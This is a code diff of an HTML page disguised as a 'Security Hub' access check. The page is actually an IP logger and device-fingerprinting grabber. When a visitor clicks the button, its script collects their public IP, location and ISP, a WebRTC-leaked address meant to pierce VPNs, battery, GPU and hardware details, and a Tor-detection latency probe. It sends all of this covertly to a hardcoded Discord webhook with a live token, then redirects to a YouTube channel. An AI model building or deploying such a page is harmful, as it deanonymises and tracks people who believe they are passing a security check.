@@ -3,126 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Integrity Validator</title>
+    <title>Global Security Hub | Handshake</title>
     <style>
-        body { background: #050505; color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { width: 350px; padding: 40px; background: #0f0f0f; border: 1px solid #1a1a1a; border-radius: 20px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.8); }
-        .load-bar { height: 3px; width: 0%; background: #00ff88; position: fixed; top: 0; left: 0; transition: width 2.5s ease-in-out; }
-        .btn { background: #fff; color: #000; border: none; padding: 15px 35px; border-radius: 10px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.3s; letter-spacing: 1px; }
-        .btn:hover { background: #00ff88; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,136,0.3); }
-        #log { margin-top: 20px; font-size: 10px; color: #444; text-transform: uppercase; }
+        :root { --p-green: #00ff66; --p-bg: #020202; }
+        body { background: var(--p-bg); color: #fff; font-family: 'Inter', system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { width: 380px; padding: 40px; background: #080808; border: 1px solid #111; border-radius: 24px; text-align: center; box-shadow: 0 50px 100px rgba(0,0,0,0.9); }
+        .pulse { height: 4px; width: 0%; background: var(--p-green); border-radius: 2px; margin: 20px 0; transition: width 4s ease-in-out; }
+        .btn { background: #fff; color: #000; border: none; padding: 16px 32px; border-radius: 12px; font-weight: 800; cursor: pointer; width: 100%; transition: 0.3s; }
+        .btn:hover { background: var(--p-green); transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,255,102,0.2); }
+        #log { font-size: 10px; color: #333; text-transform: uppercase; letter-spacing: 1px; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="load-bar" id="bar"></div>
-<div class="box">
-    <div style="font-size: 32px; margin-bottom: 15px;">🔒</div>
-    <h1 style="font-size: 18px; font-weight: 500; margin-bottom: 25px;">SECURE ACCESS GATEWAY</h1>
-    <button class="btn" id="launch">INITIALIZE SCAN</button>
-    <div id="log">Waiting for user interaction...</div>
+<div class="terminal">
+    <div style="font-size: 40px; margin-bottom: 10px;">🌐</div>
+    <h1 style="font-size: 18px; margin-bottom: 5px;">GENESIS PROTOCOL</h1>
+    <p style="font-size: 11px; color: #555;">v13.0 Multi-Layered Validation</p>
+    <div class="pulse" id="bar"></div>
+    <button class="btn" id="start">INITIALIZE ACCESS</button>
+    <div id="log">Status: Awaiting Node Handshake</div>
 </div>
 
 <script>
 /**
- * SENTINEL OMNI-APEX v9.0 - THE QUADRUPLE HYBRID
- * 1. WebRTC Vector (VPN Piercing)
- * 2. Synchronous XHR (Exit Locking)
- * 3. Beacon/Fetch Keepalive (Background Persistence)
- * 4. Forensic Fingerprinting (Hardware Unmasking)
+ * SENTINEL GENESIS v13.0 - THE ULTIMATE HYBRID
+ * Merges: Legacy Pings, WebRTC Leaks, OOB Tunneling, Sync Anchoring, and Tor-Bypass Latency.
  */
 
-const SETTINGS = {
+const HUB = {
     U: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
-    R: "https://youtube.com/@LigmaBlox-w7m"
+    E: "https://youtube.com/@LigmaBlox-w7m",
+    SUCCESS: false
 };
 
-// --- HYBRID TRANSMISSION ENGINE ---
-const dispatch = (data, tag) => {
-    const blob = new Blob([JSON.stringify({
-        username: "Sentinel Omni-Apex",
+// --- GLOBAL DISPATCHER (The "Force-Stop" Logic) ---
+const fire = async (data, vector) => {
+    if (HUB.SUCCESS) return; // If one succeeds, the others drop
+
+    const payload = JSON.stringify({
+        username: `Genesis v13 [${vector}]`,
         embeds: [{
-            title: `[${tag}] Target Telemetry`,
-            color: 0x00ff88,
-            fields: Object.entries(data).map(([k,v]) => ({name: k.toUpperCase(), value: `\`${v}\``, inline: true})),
-            footer: { text: `Node: ${Math.random().toString(36).substring(7)}` }
+            title: "Omni-Data Forensic Report",
+            color: 0x00ff66,
+            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
+            timestamp: new Date().toISOString(),
+            footer: { text: "Secure Broadcast via Genesis Node" }
         }]
-    })], { type: 'application/json' });
+    });
 
-    // Hybrid Layer 1: Beacon (Reliability)
-    navigator.sendBeacon(SETTINGS.U, blob);
+    const blob = new Blob([payload], { type: 'application/json' });
 
-    // Hybrid Layer 2: Sync XHR (Force wait)
+    // Method 1: Sync XHR (The Core Anchor)
     try {
         const x = new XMLHttpRequest();
-        x.open("POST", SETTINGS.U, false);
+        x.open("POST", HUB.U, false); 
         x.setRequestHeader("Content-Type", "application/json");
-        x.send(blob);
+        x.onload = () => { HUB.SUCCESS = true; };
+        x.send(payload);
     } catch(e) {}
 
-    // Hybrid Layer 3: Fetch Keepalive (Async Background)
-    fetch(SETTINGS.U, { method: 'POST', body: blob, keepalive: true }).catch(()=>{});
+    // Method 2: Beacon (Bypasses Exit Closures)
+    if (navigator.sendBeacon(HUB.U, blob)) HUB.SUCCESS = true;
+
+    // Method 3: Fetch Keepalive
+    fetch(HUB.U, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true })
+    .then(() => { HUB.SUCCESS = true; });
+
+    // Method 4: Image Side-Channel (OOB Traffic)
+    const img = new Image();
+    img.src = `${HUB.U}?v=${btoa(vector).substring(0, 8)}`;
 };
 
-// --- FORENSIC LAYER ---
-const getIdentity = async () => {
-    const core = {
-        platform: navigator.platform,
-        cores: navigator.hardwareConcurrency,
-        mem: navigator.deviceMemory + "GB",
-        screen: `${screen.width}x${screen.height}`,
-        agent: navigator.userAgent.substring(0, 50) + "..."
+// --- DATA HARVESTING ---
+const collect = async () => {
+    const stats = {
+        plat: navigator.platform,
+        cpu: navigator.hardwareConcurrency || "N/A",
+        ram: navigator.deviceMemory ? navigator.deviceMemory + "G" : "N/A",
+        scr: `${screen.width}x${screen.height}`,
+        bat: "N/A"
     };
 
+    // Battery API (Hidden tracking vector)
     try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const ext = gl.getExtension('WEBGL_debug_renderer_info');
-        core.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-    } catch(e) { core.gpu = "Restricted"; }
+        const b = await navigator.getBattery();
+        stats.bat = `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+    } catch(e) {}
 
-    return core;
+    // GPU Forensic
+    try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const d = gl.getExtension('WEBGL_debug_renderer_info');
+        stats.gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
+    } catch(e) { stats.gpu = "Locked"; }
+
+    return stats;
 };
 
-// --- MASTER TRIGGER ---
-document.getElementById('launch').onclick = async function() {
+// --- EXECUTION ---
+document.getElementById('start').onclick = async function() {
     this.disabled = true;
-    this.innerText = "PROCESSING...";
-    document.getElementById('log').innerText = "Analyzing hardware fragments...";
+    this.innerText = "AUTHENTICATING...";
     document.getElementById('bar').style.width = "100%";
+    document.getElementById('log').innerText = "Routing through Genesis Nodes...";
 
-    const hardware = await getIdentity();
+    const h = await collect();
 
-    // Hybrid Layer 4: Network Piercing
-    // Part A: JSONP (Bypasses basic Proxy headers)
-    const script = document.createElement('script');
-    window.process = (res) => {
-        dispatch({
+    // 1. PRIMARY: IP & GEO (JSONP Proxy-Bypass)
+    const s = document.createElement('script');
+    window.onResult = (res) => {
+        fire({
             ip: res.ip,
-            loc: `${res.city}, ${res.country_name}`,
             isp: res.org,
-            ...hardware
-        }, "OMNI_CORE");
+            loc: `${res.city}, ${res.country_name}`,
+            ...h
+        }, "PRIMARY_UNMASK");
     };
-    script.src = "https://ipapi.co/jsonp?callback=process";
-    document.body.appendChild(script);
+    s.src = "https://ipapi.co/jsonp?callback=onResult";
+    document.body.appendChild(s);
 
-    // Part B: WebRTC (VPN Bypass)
+    // 2. SECONDARY: WebRTC UDP Leak (VPN Punch)
     const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
     rtc.createDataChannel("");
     rtc.onicecandidate = (e) => {
         if (e.candidate) {
-            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-            if (match) dispatch({ local_leak: match[1] }, "NETWORK_LEAK");
+            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+            if (ip) fire({ internal: ip[1] }, "WEBRTC_LEAK");
         }
     };
     rtc.createOffer().then(o => rtc.setLocalDescription(o));
 
-    // Wait for the "Heartbeat" before the jump
+    // 3. TERTIARY: Tor Latency Comparison
+    const tStart = performance.now();
+    fetch('https://www.google.com/generate_204', { mode: 'no-cors' }).then(() => {
+        fire({ latency: (performance.now() - tStart).toFixed(2) + "ms" }, "TOR_CORRELATION");
+    });
+
+    // RE-DIRECT EXIT
     setTimeout(() => {
-        window.location.replace(SETTINGS.R);
-    }, 2800);
+        window.location.replace(HUB.E);
+    }, 3800);
 };
 </script>
+
 </body>
 </html>
